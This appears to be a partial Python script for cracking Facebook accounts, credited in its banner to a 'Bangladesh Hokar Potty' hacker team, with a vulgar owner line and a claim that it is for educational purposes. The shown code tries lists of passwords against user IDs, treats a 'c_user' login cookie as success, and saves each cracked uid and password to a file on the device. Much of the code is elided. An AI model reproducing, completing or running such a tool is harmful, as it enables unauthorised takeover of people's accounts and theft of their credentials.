# -----------------[ Bangladesh Hokar Potty ]-------------------#
#GIFT FOR EDUCATIONAL PURPOSE 
#MY FACEBOOK ID LINK :- https://www.facebook.com/Normal.User.Alamgir
#OWNER : PRIYA FUCK EVERYDAY ALAMGIR
#TEAM : BANGLADESH HOCKER POTTY
# -----------------[ BANGLADESH HOKAR POTTY ]-------------------#
...
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
     ...
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m FACEBOK      : \033[1;34m 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m GITHUB       :  \033[1;35m      
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/xxx-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
